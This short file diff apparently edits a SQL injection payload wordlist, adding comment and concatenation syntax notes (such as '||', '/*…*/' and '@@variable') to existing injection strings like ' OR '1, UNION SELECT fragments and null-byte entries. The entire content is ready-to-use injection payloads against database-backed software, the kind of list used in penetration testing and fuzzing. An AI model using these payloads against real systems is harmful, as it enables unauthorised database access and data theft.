@@ -10,7 +10,8 @@
 \
 \\
 ;
-
+' or "
+-- or # 
 ' OR '1
 ' OR 1 -- -
 " OR "" = "
@@ -24,8 +25,16 @@
 ' AND id IS NULL; --
 '''''''''''''UNION SELECT '2
 %00
+/*…*/ 
++		addition, concatenate (or space in url)
+||		(double pipe) concatenate
+%		wildcard attribute indicator
 
-#Numeric
+@variable	local variable
+@@variable	global variable
+
+
+# Numeric
 AND 1
 AND 0
 AND true
